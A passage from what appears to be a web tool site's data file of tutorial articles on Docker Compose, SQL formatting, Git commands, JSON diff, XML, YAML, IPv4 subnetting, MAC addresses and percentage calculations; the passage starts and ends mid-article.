| \`--network\` | \`networks\` | \`networks: [mynet]\` |
| \`--link\` | \`depends_on\` | \`depends_on: [db]\` |
| \`--memory 512m\` | \`mem_limit\` | \`mem_limit: 512m\` |
| \`--cpus 0.5\` | \`cpus\` | \`cpus: 0.5\` |
| \`--health-cmd\` | \`healthcheck.test\` | \`test: ["CMD", "curl", "-f", "http://localhost"]\` |
| \`--user\` | \`user\` | \`user: "1000:1000"\` |
| \`--entrypoint\` | \`entrypoint\` | \`entrypoint: /app/start.sh\` |
| \`--command\` | \`command\` | \`command: npm start\` |

## Multi-Service Example: Web + Database

\`\`\`yaml
version: '3.8'

services:
  web:
    build: .
    ports:
      - "3000:3000"
    environment:
      - DATABASE_URL=postgres://user:pass@db:5432/myapp
    depends_on:
      db:
        condition: service_healthy
    restart: unless-stopped

  db:
    image: postgres:15
    environment:
      POSTGRES_USER: user
      POSTGRES_PASSWORD: pass
      POSTGRES_DB: myapp
    volumes:
      - postgres_data:/var/lib/postgresql/data
    healthcheck:
      test: ["CMD-SHELL", "pg_isready -U user"]
      interval: 5s
      timeout: 5s
      retries: 5
    restart: unless-stopped

volumes:
  postgres_data:
\`\`\`

## Docker Compose Commands

\`\`\`bash
# Start all services (detached)
docker compose up -d

# Stop all services
docker compose down

# Stop and remove volumes
docker compose down -v

# View logs
docker compose logs -f

# View specific service logs
docker compose logs -f web

# Execute command in running container
docker compose exec web bash

# Rebuild images
docker compose build

# Scale a service
docker compose up -d --scale worker=3

# View running services
docker compose ps
\`\`\`

## Environment Variables in Compose

Use a \`.env\` file (automatically loaded by Compose) for secrets and environment-specific config:

\`\`\`bash
# .env file
POSTGRES_PASSWORD=secretpassword
NODE_ENV=production
API_KEY=abc123
\`\`\`

\`\`\`yaml
# docker-compose.yml
services:
  web:
    environment:
      - NODE_ENV=\${NODE_ENV}
      - API_KEY=\${API_KEY}
  db:
    environment:
      POSTGRES_PASSWORD: \${POSTGRES_PASSWORD}
\`\`\`

The \`.env\` file should be in \`.gitignore\`. Share a \`.env.example\` file instead with placeholder values.

## Restart Policies

| Policy | Behavior |
|---|---|
| \`no\` | Never restart (default) |
| \`always\` | Always restart, including on Docker daemon restart |
| \`on-failure\` | Only restart on non-zero exit code |
| \`unless-stopped\` | Always restart unless manually stopped |

## Using This Tool

Paste a \`docker run\` command to instantly get the equivalent Docker Compose YAML. The tool parses all flags and options and generates a properly formatted Compose service definition.

-> Try the [Docker Run to Compose Converter](/docker-run-to-docker-compose-converter)`,
  },
  {
    slug: 'sql-prettify-guide',
    toolPath: '/sql-format',
    title: 'How to Format SQL Queries for Better Readability',
    description: 'Learn SQL formatting best practices and use our formatter to clean up messy queries.',
    keywords: ['SQL formatter', 'SQL prettify', 'format SQL online', 'SQL beautifier'],
    category: 'Development',
    publishedAt: '2025-07-11',
    content: `## What Is SQL Formatting?

SQL (Structured Query Language) formatting refers to consistently styling SQL code for readability and maintainability. Well-formatted SQL is easier to read, debug, and review in version control. Since SQL is whitespace-insensitive, the same query can be written in many ways - formatting is about human readability.

## SQL Formatting Conventions

### Keyword Case
SQL keywords are traditionally written in UPPERCASE, while identifiers (table names, column names) use lowercase or snake_case:

\`\`\`sql
-- Recommended
SELECT user_id, first_name, last_name
FROM users
WHERE created_at > '2025-01-01'
ORDER BY last_name ASC;

-- Poor (harder to distinguish keywords from identifiers)
select user_id, first_name, last_name from users where created_at > '2025-01-01' order by last_name asc;
\`\`\`

### Indentation
Each clause starts on a new line, with continuation lines indented:

\`\`\`sql
SELECT
    u.user_id,
    u.first_name,
    u.last_name,
    o.order_count
FROM users u
LEFT JOIN (
    SELECT user_id, COUNT(*) AS order_count
    FROM orders
    WHERE status = 'completed'
    GROUP BY user_id
) o ON u.user_id = o.user_id
WHERE u.created_at > '2025-01-01'
  AND u.active = TRUE
ORDER BY u.last_name ASC, u.first_name ASC
LIMIT 100;
\`\`\`

### Column Alignment
Align columns after SELECT for readability in complex queries:

\`\`\`sql
SELECT
    p.product_id,
    p.product_name,
    p.price,
    c.category_name,
    COUNT(oi.order_item_id) AS order_count,
    SUM(oi.quantity)        AS total_quantity
FROM products p
JOIN categories c ON p.category_id = c.category_id
LEFT JOIN order_items oi ON p.product_id = oi.product_id
GROUP BY p.product_id, p.product_name, p.price, c.category_name
HAVING COUNT(oi.order_item_id) > 10
ORDER BY order_count DESC;
\`\`\`

## Writing Readable JOINs

Express JOIN conditions clearly, showing the relationship between tables:

\`\`\`sql
-- Bad: implicit join (avoid)
SELECT * FROM orders, users
WHERE orders.user_id = users.user_id;

-- Good: explicit JOIN
SELECT
    o.order_id,
    u.email,
    o.total_amount
FROM orders o
INNER JOIN users u ON o.user_id = u.user_id
WHERE o.created_at >= CURRENT_DATE - INTERVAL '30 days';
\`\`\`

## SQL Query Optimization Tips

### Use Indexes Effectively
\`\`\`sql
-- Check if column is indexed before filtering:
EXPLAIN ANALYZE SELECT * FROM users WHERE email = 'test@example.com';

-- Create an index for frequently filtered columns:
CREATE INDEX idx_users_email ON users(email);
\`\`\`

### Avoid SELECT *
Always specify the columns you need. \`SELECT *\` transfers unnecessary data and breaks code when table schemas change:
\`\`\`sql
-- Bad
SELECT * FROM products WHERE category_id = 5;

-- Good
SELECT product_id, product_name, price FROM products WHERE category_id = 5;
\`\`\`

### Use EXISTS Instead of COUNT for Existence Checks
\`\`\`sql
-- Bad (counts all matching rows)
SELECT * FROM users WHERE (SELECT COUNT(*) FROM orders WHERE user_id = users.id) > 0;

-- Good (stops at first match)
SELECT * FROM users WHERE EXISTS (SELECT 1 FROM orders WHERE user_id = users.id);
\`\`\`

## SQL Dialects

SQL comes in several dialects with syntax variations:

| Feature | Standard SQL | PostgreSQL | MySQL | SQL Server | SQLite |
|---|---|---|---|---|---|
| String concat | \`||\` | \`||\` | \`CONCAT()\` | \`+\` | \`||\` |
| Current time | \`CURRENT_TIMESTAMP\` | \`NOW()\` | \`NOW()\` | \`GETDATE()\` | \`CURRENT_TIMESTAMP\` |
| Limit rows | \`FETCH FIRST n ROWS\` | \`LIMIT n\` | \`LIMIT n\` | \`TOP n\` | \`LIMIT n\` |
| Auto-increment | \`GENERATED ALWAYS AS IDENTITY\` | \`SERIAL\` or \`BIGSERIAL\` | \`AUTO_INCREMENT\` | \`IDENTITY\` | \`AUTOINCREMENT\` |

This tool formats SQL for standard SQL, PostgreSQL, MySQL, and SQL Server dialects.

## Using This Tool

Paste any SQL query to instantly format it with proper indentation, keyword casing, and spacing. Supports all major SQL dialects and handles complex queries including subqueries, CTEs, window functions, and stored procedures.

-> Try the [SQL Prettify Tool](/sql-format)`,
  },
  {
    slug: 'git-memo-common-commands',
    toolPath: '/git-memo',
    title: 'Git Command Cheat Sheet: The Most Useful Commands Explained',
    description: 'A comprehensive Git reference covering everyday commands, branching, undo operations, and advanced workflows.',
    keywords: ['git cheat sheet', 'git commands', 'git memo', 'git reference', 'git workflow'],
    category: 'Development',
    publishedAt: '2025-07-12',
    content: `## Essential Git Commands Reference

Git is the most widely used distributed version control system. This reference covers the most important commands with practical examples for daily development workflows.

## Configuration

\`\`\`bash
# Set user identity (required before first commit)
git config --global user.name "Your Name"
git config --global user.email "you@example.com"

# Set default editor
git config --global core.editor "code --wait"

# Set default branch name
git config --global init.defaultBranch main

# View all configuration
git config --list

# View specific setting
git config user.email
\`\`\`

## Repository Setup

\`\`\`bash
# Initialize a new repository
git init
git init my-project

# Clone a remote repository
git clone https://github.com/user/repo.git
git clone https://github.com/user/repo.git custom-folder

# Clone only specific branch
git clone -b develop https://github.com/user/repo.git
\`\`\`

## Daily Workflow Commands

\`\`\`bash
# Check status of working directory
git status
git status -s    # Short format

# Stage changes
git add file.txt           # Stage specific file
git add .                  # Stage all changes
git add -p                 # Stage changes interactively (patch mode)
git add src/               # Stage entire directory

# Commit
git commit -m "feat: add user authentication"
git commit -am "fix: correct typo"  # Stage tracked files and commit
git commit --amend          # Amend last commit message or add staged changes

# View history
git log
git log --oneline           # One line per commit
git log --oneline --graph   # ASCII graph of branches
git log -n 10               # Last 10 commits
git log --since="2 weeks ago"
git log --author="Alice"
git log --grep="login"      # Search commit messages
\`\`\`

## Branching

\`\`\`bash
# Create and switch to new branch
git checkout -b feature/login  # Traditional
git switch -c feature/login    # Modern (Git 2.23+)

# Switch between branches
git checkout main
git switch main

# List branches
git branch           # Local branches
git branch -a        # All branches (local + remote)
git branch -v        # Show last commit on each branch

# Delete branch
git branch -d feature/done  # Safe delete (merged only)
git branch -D feature/old   # Force delete

# Rename current branch
git branch -m new-name
\`\`\`

## Remote Operations

\`\`\`bash
# Add remote
git remote add origin https://github.com/user/repo.git

# View remotes
git remote -v

# Fetch (download changes, don't merge)
git fetch origin
git fetch --all

# Pull (fetch + merge)
git pull origin main
git pull --rebase origin main  # Pull with rebase instead of merge

# Push
git push origin feature/login
git push -u origin feature/login  # Set upstream (-u) for future git push
git push --force-with-lease       # Safer alternative to --force
\`\`\`

## Merging and Rebasing

\`\`\`bash
# Merge branch into current branch
git merge feature/login
git merge --no-ff feature/login  # Always create merge commit

# Rebase current branch onto main
git rebase main
git rebase -i HEAD~3  # Interactive rebase of last 3 commits

# Abort rebase if conflicts are too complex
git rebase --abort
\`\`\`

## Stashing

\`\`\`bash
# Save work in progress temporarily
git stash
git stash push -m "WIP: half-done feature"

# List stashes
git stash list

# Apply most recent stash
git stash pop          # Apply and remove from stash
git stash apply        # Apply but keep in stash

# Apply specific stash
git stash apply stash@{2}

# Drop stash
git stash drop stash@{0}
git stash clear        # Remove all stashes
\`\`\`

## Undoing Changes

\`\`\`bash
# Discard working directory changes (unstaged)
git restore file.txt           # Modern
git checkout -- file.txt       # Traditional

# Unstage a file (keep changes in working directory)
git restore --staged file.txt

# Undo last commit (keep changes staged)
git reset --soft HEAD~1

# Undo last commit (keep changes unstaged)
git reset HEAD~1

# Undo last commit (discard changes entirely)
git reset --hard HEAD~1

# Revert a commit (creates a new commit that undoes changes)
git revert abc1234    # Safe for shared history
\`\`\`

-> Try the [Git Memo Reference](/git-memo)`,
  },
  {
    slug: 'json-diff-guide',
    toolPath: '/json-diff',
    title: 'JSON Diff: How to Compare Two JSON Objects',
    description: 'Compare two JSON objects and highlight differences. Learn how JSON diff tools work and when to use them.',
    keywords: ['JSON diff', 'compare JSON', 'JSON comparison', 'JSON difference', 'JSON merge'],
    category: 'Development',
    publishedAt: '2025-07-13',
    content: `## What Is JSON Diffing?

JSON diffing is the process of comparing two JSON documents to identify what has changed between them. This is essential when debugging API responses, tracking configuration changes, reviewing data migrations, or investigating when and how data changed over time.

A good JSON diff tool goes beyond simple text comparison - it understands the JSON structure and shows meaningful semantic differences.

## Types of JSON Changes

When comparing two JSON documents, changes fall into four categories:

**Added**: Keys/values present in the new version but not the old:
\`\`\`json
// Old:  { "name": "Alice" }
// New:  { "name": "Alice", "age": 30 }
// Diff: + "age": 30
\`\`\`

**Removed**: Keys/values present in the old version but not the new:
\`\`\`json
// Old:  { "name": "Alice", "status": "pending" }
// New:  { "name": "Alice" }
// Diff: - "status": "pending"
\`\`\`

**Changed**: Values that exist in both but have different values:
\`\`\`json
// Old:  { "count": 10 }
// New:  { "count": 15 }
// Diff: ~ "count": 10 -> 15
\`\`\`

**Unchanged**: Keys/values identical in both versions (often hidden in diff views).

## Array Comparison Challenges

Arrays are more complex to diff than objects because items don't have inherent keys. Consider:

\`\`\`json
// Old: [1, 2, 3, 4]
// New: [1, 3, 4, 5]
\`\`\`

A naive comparison might say positions 1, 2, 3 all changed. A smarter diff recognizes that element \`2\` was deleted and element \`5\` was added.

For arrays of objects, the choice of what to use as a key for matching matters:
\`\`\`json
// Old: [{"id": 1, "name": "Alice"}, {"id": 2, "name": "Bob"}]
// New: [{"id": 2, "name": "Bobby"}, {"id": 3, "name": "Charlie"}]
\`\`\`
Using \`id\` as the key: Alice(1) removed, Bob(2) renamed to Bobby, Charlie(3) added.

## JSON Diff Algorithms

The JSON Merge Patch (RFC 7396) format describes differences compactly:
\`\`\`json
// Patch to transform old -> new
{
  "removed_field": null,    // null means delete
  "changed_field": "new_value",
  "new_field": "added_value"
  // absent fields are unchanged
}
\`\`\`

The JSON Patch (RFC 6902) format describes differences as a sequence of operations:
\`\`\`json
[
  { "op": "remove", "path": "/removed_field" },
  { "op": "replace", "path": "/changed_field", "value": "new_value" },
  { "op": "add", "path": "/new_field", "value": "added_value" }
]
\`\`\`

JSON Patch supports these operations: \`add\`, \`remove\`, \`replace\`, \`move\`, \`copy\`, \`test\`.

## Practical Use Cases

### API Response Debugging
When an API response changes unexpectedly, diffing two consecutive responses reveals exactly what changed. This is especially valuable when debugging intermittent issues.

### Configuration Management
Comparing configuration files between environments (development vs staging vs production) helps identify environment-specific differences.

### Database Migration Verification
After a data migration, diffing JSON exports from before and after verifies that the migration transformed data correctly.

### Code Review
Reviewing changes to JSON schema files or sample API responses becomes much clearer with a structural diff tool.

## Using This Tool

Paste two JSON documents in the side-by-side editor. The tool:
- Validates both documents as valid JSON
- Shows structural differences with color coding (green=added, red=removed, yellow=changed)
- Handles nested objects and arrays
- Provides both visual diff and a JSON Patch output

-> Try the [JSON Diff Tool](/json-diff)`,
  },
  {
    slug: 'xml-formatter-guide',
    toolPath: '/xml-format',
    title: 'XML Formatter: How to Pretty-Print and Validate XML',
    description: 'Format and validate XML documents. Learn XML structure, namespaces, and common parsing errors.',
    keywords: ['XML formatter', 'XML validator', 'pretty print XML', 'XML online', 'XML beautifier'],
    category: 'Development',
    publishedAt: '2025-07-14',
    content: `## What Is XML?

XML (Extensible Markup Language) is a markup language designed to store and transport data in a format that is both human-readable and machine-readable. Unlike HTML (which defines a fixed set of tags), XML allows you to define your own tags, making it highly flexible for representing any structured data.

XML was developed by the W3C in 1998 and remains widely used in enterprise systems, SOAP web services, document formats (DOCX, SVG, RSS), and configuration files (Maven, Spring, Android).

## XML vs HTML: Key Differences

| Feature | XML | HTML |
|---|---|---|
| Purpose | Data storage and transport | Web page structure |
| Tag names | Custom, user-defined | Fixed (div, p, span...) |
| Case sensitivity | Case-sensitive | Case-insensitive |
| Closing tags | Mandatory | Optional for some |
| Self-closing | Required for empty elements | Optional |
| Error handling | Strict (malformed = invalid) | Lenient (browsers guess) |

## XML Syntax Rules

XML has strict syntax requirements:

1. **Exactly one root element**: Every XML document has one root element that contains all others.

2. **Tags are case-sensitive**: \`<Name>\` and \`<name>\` are different elements.

3. **All tags must be closed**: Either \`<tag></tag>\` or self-closing \`<tag />\`.

4. **Proper nesting**: Tags must be properly nested (no overlapping):
   \`\`\`
   Bad:  <b><i>text</b></i>
   Good: <b><i>text</i></b>
   \`\`\`

5. **Attribute values must be quoted**: \`<element attr="value">\` or single quotes.

6. **Special characters must be escaped**:
   \`\`\`
   &  ->  &amp;
   <  ->  &lt;
   >  ->  &gt;
   "  ->  &quot;
   '  ->  &apos;
   \`\`\`

## Well-Formed vs Valid XML

**Well-formed** XML follows all syntax rules. Any XML parser will accept it.

**Valid** XML additionally conforms to a schema (DTD or XSD). Validity is optional but important for data exchange.

## XML Structure Example

\`\`\`xml
<?xml version="1.0" encoding="UTF-8"?>
<library xmlns="http://example.com/library">
  <book id="1" category="fiction">
    <title>The Great Gatsby</title>
    <author>F. Scott Fitzgerald</author>
    <year>1925</year>
    <price currency="USD">12.99</price>
  </book>
  <book id="2" category="technical">
    <title>Clean Code</title>
    <author>Robert C. Martin</author>
    <year>2008</year>
    <price currency="USD">35.99</price>
  </book>
</library>
\`\`\`

## Namespaces

XML namespaces prevent name conflicts when combining XML from different sources:

\`\`\`xml
<root
  xmlns:html="http://www.w3.org/1999/xhtml"
  xmlns:svg="http://www.w3.org/2000/svg">
  
  <html:div>HTML content</html:div>
  <svg:circle cx="50" cy="50" r="10"/>
</root>
\`\`\`

## XML in Modern Development

While JSON has largely replaced XML for REST APIs, XML remains essential in several contexts:

- **SOAP web services**: Still common in enterprise environments (banking, healthcare)
- **Office documents**: DOCX, XLSX, PPTX are ZIP archives containing XML files
- **SVG graphics**: Scalable Vector Graphics is XML-based
- **RSS/Atom feeds**: Web content syndication uses XML
- **Android**: Layout files, AndroidManifest.xml
- **Maven/Gradle**: Java build configuration
- **Spring**: Application context and configuration
- **XSLT**: XML transformation language for converting XML to other formats

## XPath: Querying XML

XPath is a query language for selecting nodes in XML:

\`\`\`xpath
/library/book[@category='fiction']    # Select fiction books
/library/book/title                   # Select all titles
//book[price > 20]                    # Books costing over 20 (anywhere in document)
/library/book[last()]                 # Last book
count(/library/book)                  # Count all books
\`\`\`

## Using This Tool

Paste any XML document to instantly format and prettify it with proper indentation and syntax highlighting. The tool also validates XML syntax and reports specific errors with line numbers.

-> Try the [XML Formatter](/xml-format)`,
  },
  {
    slug: 'yaml-viewer-guide',
    toolPath: '/yaml-format',
    title: 'YAML Viewer and Formatter: Validate and Pretty-Print YAML',
    description: 'Format and validate YAML files. Learn YAML syntax, common errors, and best practices.',
    keywords: ['YAML formatter', 'YAML validator', 'YAML viewer', 'pretty print YAML', 'YAML syntax'],
    category: 'Development',
    publishedAt: '2025-07-15',
    content: `## What Is YAML?

YAML (YAML Ain't Markup Language, a recursive acronym) is a human-friendly data serialization standard. Designed to be readable by both humans and machines, YAML uses indentation and minimal punctuation to express data structures.

YAML has become the dominant format for configuration files in modern infrastructure and DevOps: Docker Compose, Kubernetes manifests, GitHub Actions workflows, Ansible playbooks, and many application configuration frameworks all use YAML.

## YAML Data Types

YAML automatically infers data types based on the value:

\`\`\`yaml
# Strings (no quotes needed unless value is ambiguous)
name: Alice
message: "This requires quotes: it has a colon"
long_string: 'Single quotes also work'

# Integers and floats
port: 8080
price: 19.99
negative: -5

# Booleans (careful - many values are truthy)
enabled: true     # or yes, on, True, TRUE
disabled: false   # or no, off, False, FALSE

# Null
optional: null    # or ~
empty:            # Also null

# Dates
birthday: 1990-01-15
created_at: 2025-06-15T14:30:00Z
\`\`\`

## YAML Collections

### Mappings (Objects)
\`\`\`yaml
user:
  id: 1
  name: Alice
  email: alice@example.com
  address:
    city: New York
    country: US

# Flow style (compact, like JSON)
user: {id: 1, name: Alice, email: alice@example.com}
\`\`\`

### Sequences (Arrays)
\`\`\`yaml
# Block style
tags:
  - python
  - javascript
  - docker

# Flow style
tags: [python, javascript, docker]

# Array of objects
users:
  - id: 1
    name: Alice
  - id: 2
    name: Bob
\`\`\`

## YAML Anchors and Aliases

YAML's most powerful feature for avoiding repetition:

\`\`\`yaml
# Define an anchor with &
default_config: &defaults
  database: postgres
  pool_size: 10
  timeout: 30
  retry: 3

# Reuse with *
production:
  <<: *defaults          # Merge all defaults
  pool_size: 50          # Override specific value
  environment: prod

staging:
  <<: *defaults
  environment: staging
\`\`\`

## Multi-Line Strings

YAML handles multi-line strings elegantly:

\`\`\`yaml
# Literal block (|) - preserves newlines and trailing newline
script: |
  #!/bin/bash
  set -e
  echo "Starting deployment"
  npm run build
  pm2 restart app

# Folded block (>) - joins lines with spaces
description: >
  This is a long description that
  will be joined into a single
  paragraph.

# Chomping indicators
text_trim: |-     # No trailing newline
  content
text_keep: |+     # Keep all trailing newlines
  content
\`\`\`

## YAML Best Practices

### Use Consistent Indentation
YAML is indentation-sensitive. Choose 2 or 4 spaces and stick to it throughout the file. Never mix tabs.

### Quote Strings That Look Like Other Types
\`\`\`yaml
# Without quotes, these become non-strings
version: "1.0"        # String, not float 1.0
zip: "01234"          # String, not int 1234 (loses leading zero)
active: "yes"         # String, not boolean true
\`\`\`

### Use Descriptive Comments
\`\`\`yaml
# Database connection settings
database:
  host: localhost      # Use 'db' in Docker Compose
  port: 5432           # Default PostgreSQL port
  name: myapp
\`\`\`

## Common YAML Use Cases

**Kubernetes**: Every resource definition (Pod, Deployment, Service, ConfigMap) is a YAML file.

**GitHub Actions**: Workflow files defining CI/CD pipelines.

**Docker Compose**: Multi-container application definitions.

**Ansible**: Infrastructure automation playbooks and inventory files.

**Spring Boot**: Application configuration (application.yml).

**Ruby on Rails**: Database configuration (database.yml), environment configs.

## YAML Pitfalls

The Norway Problem: In YAML 1.1, the value \`NO\` (country code for Norway) is parsed as \`false\`. YAML 1.2 fixed this, but many parsers still use YAML 1.1 behavior. When in doubt, quote strings.

Tab prohibition: YAML 1.1 completely prohibits tab characters for indentation. Always use spaces.

Float parsing: Values like \`1.0\`, \`1e5\`, \`.inf\`, \`.nan\` are parsed as floats/special values in some parsers.

## Using This Tool

Paste any YAML document to instantly validate it, view the parsed structure as a tree, and see any syntax errors with line numbers. The tool highlights each data type with different colors for easy identification.

-> Try the [YAML Viewer](/yaml-viewer)`,
  },

  // ─── Network ──────────────────────────────────────────────────
  {
    slug: 'ipv4-subnet-calculator-guide',
    toolPath: '/ipv4-subnet-calculator',
    title: 'IPv4 Subnetting Explained: CIDR, Subnet Masks, and Network Ranges',
    description: 'Master IPv4 subnetting. Learn CIDR notation, calculate network ranges, hosts, and broadcast addresses.',
    keywords: ['subnet calculator', 'CIDR notation', 'IPv4 subnetting', 'subnet mask', 'network range'],
    category: 'Network',
    publishedAt: '2025-07-20',
    content: `## What Is IP Subnetting?

IP subnetting is the practice of dividing a large network into smaller sub-networks (subnets). Each subnet is a logical subdivision of an IP network, allowing for better organization, security isolation, and efficient use of IP addresses.

Understanding subnetting is essential for network engineers, system administrators, DevOps professionals, and anyone working with cloud infrastructure (AWS VPCs, Azure VNets, GCP VPCs all use subnetting concepts).

## IPv4 Address Structure

An IPv4 address is a 32-bit number, typically written as four octets (bytes) in decimal, separated by dots:

\`\`\`
192.168.1.100
│   │   │ └── Host portion
│   │   └──── Host portion
│   └──────── Network or host portion
└──────────── Network portion
\`\`\`

Each octet ranges from 0 to 255 (8 bits). The boundary between the network and host portions is determined by the **subnet mask**.

## Subnet Masks

A subnet mask is a 32-bit number with consecutive 1s followed by consecutive 0s:

\`\`\`
255.255.255.0 = 11111111.11111111.11111111.00000000
\`\`\`

The 1-bits indicate the network portion; the 0-bits indicate the host portion.

**CIDR Notation** is a compact way to express subnet masks as a prefix length:
\`\`\`
192.168.1.0/24  means 24 bits for network, 8 bits for hosts
192.168.0.0/16  means 16 bits for network, 16 bits for hosts
10.0.0.0/8      means 8 bits for network, 24 bits for hosts
\`\`\`

## Common Subnet Sizes

| CIDR | Subnet Mask | Usable Hosts | Use Case |
|---|---|---|---|
| /30 | 255.255.255.252 | 2 | Point-to-point links |
| /29 | 255.255.255.248 | 6 | Small office segment |
| /28 | 255.255.255.240 | 14 | Small team subnet |
| /27 | 255.255.255.224 | 30 | Department subnet |
| /26 | 255.255.255.192 | 62 | Medium segment |
| /25 | 255.255.255.128 | 126 | Half of a /24 |
| /24 | 255.255.255.0 | 254 | Standard LAN |
| /23 | 255.255.254.0 | 510 | Two /24s combined |
| /22 | 255.255.252.0 | 1022 | Four /24s |
| /16 | 255.255.0.0 | 65,534 | Large enterprise |
| /8 | 255.0.0.0 | 16,777,214 | ISP allocation |

Formula: Usable hosts = 2^(32-prefix) - 2 (subtract network and broadcast addresses).

## Network, Broadcast, and Host Addresses

For any subnet, three special addresses exist:

**Network address**: All host bits are 0. Identifies the subnet itself.
**Broadcast address**: All host bits are 1. Sends to all hosts in subnet.
**Usable host range**: Everything between network and broadcast.

Example for 192.168.1.0/24:
\`\`\`
Network:   192.168.1.0   (host bits = 00000000)
First host: 192.168.1.1
Last host:  192.168.1.254
Broadcast: 192.168.1.255  (host bits = 11111111)
\`\`\`

## Private IP Address Ranges

RFC 1918 defines three ranges for private (non-routable) use:

| Range | CIDR | Addresses |
|---|---|---|
| 10.0.0.0 - 10.255.255.255 | 10.0.0.0/8 | 16,777,216 |
| 172.16.0.0 - 172.31.255.255 | 172.16.0.0/12 | 1,048,576 |
| 192.168.0.0 - 192.168.255.255 | 192.168.0.0/16 | 65,536 |

These addresses are used in home networks, corporate intranets, and cloud VPCs. They cannot be directly routed on the public internet.

## Subnetting a Network

To divide 192.168.1.0/24 into 4 equal subnets:
- Need 2 bits for 4 subnets (2^2 = 4)
- New prefix: /24 + 2 = /26
- Each subnet has 2^6 - 2 = 62 usable hosts

\`\`\`
Subnet 1: 192.168.1.0/26   (hosts: .1 - .62,   broadcast: .63)
Subnet 2: 192.168.1.64/26  (hosts: .65 - .126,  broadcast: .127)
Subnet 3: 192.168.1.128/26 (hosts: .129 - .190, broadcast: .191)
Subnet 4: 192.168.1.192/26 (hosts: .193 - .254, broadcast: .255)
\`\`\`

## Cloud Networking (AWS/Azure/GCP)

In cloud environments, subnets define network segmentation within a VPC (Virtual Private Cloud):

- **Public subnets**: Have internet gateway access (for load balancers, NAT)
- **Private subnets**: No direct internet access (for application servers, databases)
- **VPC CIDR**: Typically 10.0.0.0/16 (65,534 addresses)
- **Subnet CIDR**: Typically /24 per availability zone (254 addresses)

## Using This Tool

Enter an IP address and CIDR notation (or subnet mask) to instantly see the network address, broadcast address, usable host range, number of hosts, subnet mask in all formats, and whether the IP is private or public.

-> Try the [IPv4 Subnet Calculator](/ipv4-subnet-calculator)`,
  },
  {
    slug: 'mac-address-guide',
    toolPath: '/mac-address-generator',
    title: 'MAC Address Explained: Format, OUI, and How to Generate One',
    description: 'Learn about MAC addresses, their format, OUI lookup, and how to generate random or vendor-specific MAC addresses.',
    keywords: ['MAC address generator', 'MAC address lookup', 'OUI lookup', 'MAC address format', 'network hardware'],
    category: 'Network',
    publishedAt: '2025-07-21',
    content: `## What Is a MAC Address?

A MAC (Media Access Control) address is a unique hardware identifier assigned to every network interface card (NIC) at the factory. Unlike IP addresses (which are logical and can change), MAC addresses are burned into the hardware and are intended to be globally unique.

MAC addresses operate at Layer 2 (the Data Link Layer) of the OSI model. They are used to identify devices on a local network segment, enabling Ethernet switches and Wi-Fi access points to deliver frames to the correct device.

## MAC Address Format

A MAC address is 48 bits (6 bytes) long, typically written as 6 pairs of hexadecimal digits separated by colons, hyphens, or no separator:

\`\`\`
AA:BB:CC:DD:EE:FF  (colon notation - most common)
AA-BB-CC-DD-EE-FF  (hyphen notation - Windows)
AABBCCDDEEFF       (no separator)
AAB.BCC.DDE.EFF    (Cisco dot notation)
\`\`\`

## OUI: The Manufacturer Identifier

The first 3 bytes (24 bits) of a MAC address are the **Organizationally Unique Identifier (OUI)**, assigned by the IEEE to each manufacturer:

\`\`\`
AA:BB:CC:DD:EE:FF
└──────┘└──────┘
  OUI     NIC-specific
(Manufacturer) (Device)
\`\`\`

Common OUI examples:
- \`00:50:56\` - VMware virtual machines
- \`00:0C:29\` - VMware Workstation
- \`3C:22:FB\` - Apple, Inc.
- \`00:14:22\` - Dell Inc.
- \`DC:A6:32\` - Raspberry Pi Trading Ltd.
- \`00:1A:2B\` - Cisco Systems

## Special MAC Addresses

| Address | Meaning |
|---|---|
| \`FF:FF:FF:FF:FF:FF\` | Broadcast - sent to all devices on segment |
| \`01:00:5E:xx:xx:xx\` | IPv4 multicast |
| \`33:33:xx:xx:xx:xx\` | IPv6 multicast |
| \`00:00:00:00:00:00\` | Invalid/unset |

The least significant bit of the first byte indicates:
- \`0\`: Unicast (individual device address)
- \`1\`: Multicast (group address)

The second least significant bit of the first byte indicates:
- \`0\`: Globally administered (burned in by manufacturer)
- \`1\`: Locally administered (set by software/administrator)

## MAC vs IP Address

| Property | MAC Address | IP Address |
|---|---|---|
| Layer | Layer 2 (Data Link) | Layer 3 (Network) |
| Scope | Local network segment | Global or local |
| Uniqueness | Globally unique | Unique within scope |
| Assignment | Hardware (factory) | Software/DHCP |
| Changeability | Technically permanent | Frequently changes |
| Format | 48-bit hex | 32-bit (IPv4) or 128-bit (IPv6) |

## MAC Address Spoofing

Despite being "hardware" addresses, MAC addresses can be changed in software (MAC spoofing). This is used legitimately for:
- Network testing and troubleshooting
- Privacy (iOS, Android, Windows randomize MAC per network)
- Bypassing MAC-based access controls for testing

For security purposes, never rely solely on MAC address filtering for network access control.

## MAC Randomization for Privacy

Modern devices randomize their MAC address when scanning for networks and can use different MACs per network. iOS 14+, Android 10+, and Windows 10+ all implement this feature by default. The second least significant bit of the first byte is set to 1 for locally administered (randomized) addresses.

## Finding Your MAC Address

\`\`\`bash
# Linux
ip link show
# or
ifconfig

# macOS
ifconfig en0 | grep ether

# Windows
ipconfig /all
# Look for "Physical Address"
\`\`\`

## Using This Tool

Enter any MAC address to look up:
- Manufacturer name from the IEEE OUI database
- Device type (if identifiable)
- Whether the address is unicast/multicast and globally/locally administered
- Formatted versions in all common notations

-> Try the [MAC Address Generator](/mac-address-generator)`,
  },

  // ─── Math ─────────────────────────────────────────────────────
  {
    slug: 'percentage-calculator-guide',
    toolPath: '/percentage-calculator',
    title: 'Percentage Calculations: Formulas, Examples, and a Free Calculator',
    description: 'Learn all types of percentage calculations: X% of Y, percentage change, what percent X is of Y.',
    keywords: ['percentage calculator', 'how to calculate percentage', 'percentage change', 'percent of number'],
    category: 'Math',
    publishedAt: '2025-07-25',
    content: `## Understanding Percentage Calculations

Percentages are one of the most practical mathematical tools in everyday life. From calculating discounts to understanding statistics, tips, tax rates, and financial returns, percentages appear constantly. This guide explains the core percentage calculations and their real-world applications.

## What Is a Percentage?

A percentage (from Latin "per centum" meaning "per hundred") expresses a number as a fraction of 100. The symbol % means "out of 100":

\`\`\`
50% = 50/100 = 0.5
25% = 25/100 = 0.25
150% = 150/100 = 1.5  (more than the whole)
\`\`\`

## Core Percentage Formulas

### Formula 1: What is X% of Y?
\`\`\`
Result = (X / 100) * Y

Example: What is 15% of 200?
Result = (15 / 100) * 200 = 30
\`\`\`

### Formula 2: X is what percent of Y?
\`\`\`
Percent = (X / Y) * 100

Example: 45 is what percent of 180?
Percent = (45 / 180) * 100 = 25%
\`\`\`

### Formula 3: X is Y% of what number?
\`\`\`
Total = X / (Y / 100) = X * (100 / Y)

Example: 30 is 15% of what number?
